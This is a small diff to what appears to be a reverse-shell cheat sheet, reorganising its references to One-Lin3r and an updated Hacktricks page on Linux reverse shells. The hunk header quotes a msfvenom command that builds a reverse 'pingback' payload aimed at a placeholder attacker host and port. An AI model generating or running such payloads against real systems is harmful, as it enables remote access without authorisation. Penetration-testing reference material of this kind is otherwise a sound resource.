@@ -55,6 +55,10 @@ $ msfvenom -p cmd/unix/pingback_reverse lhost=<IP> lport=<PORT>
 ---
 ## References
 
-- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
+### Github
 
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+
+### Hacktricks
+
+- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
